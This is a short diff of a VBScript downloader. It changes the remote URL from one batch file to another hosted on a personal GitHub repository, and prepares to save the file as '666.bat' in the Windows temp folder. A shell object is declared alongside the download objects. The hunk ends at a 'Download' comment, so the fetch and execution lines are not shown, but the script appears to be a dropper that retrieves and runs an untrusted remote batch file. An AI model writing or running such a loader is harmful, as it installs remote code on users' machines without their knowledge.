@@ -1,6 +1,6 @@
 Dim http, stream, shell, tempPath, url, fso
 
-url = "https://i-like-boys.com/666.bat"
+url = "https://github.com/aledreamer1234-lgtm/444/raw/refs/heads/main/babi.bat"
 tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\666.bat"
 
 ' Download
